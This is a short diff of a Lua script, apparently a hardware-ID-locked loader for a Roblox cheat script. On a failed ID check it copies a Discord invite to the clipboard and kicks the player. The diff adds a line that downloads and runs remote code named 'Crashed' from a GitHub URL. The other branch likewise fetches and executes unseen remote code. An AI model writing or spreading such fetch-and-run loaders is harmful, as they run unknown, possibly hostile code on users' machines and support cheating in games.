@@ -3,7 +3,7 @@ if gethwid() ~= "674bf1d82ea320dc1268aec06bbbc929e33dfa6370684a09605853bfd1ff7d1
     error("https://discord.gg/FcEGmkNDDe")
     setclipboard("https://discord.gg/FcEGmkNDDe")
     game.Players.LocalPlayer:Kick("Your Hardware ID Is Wrong And Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
-    return
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/Crashed"))()
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/0saNSNM"))()
     task.wait(2)
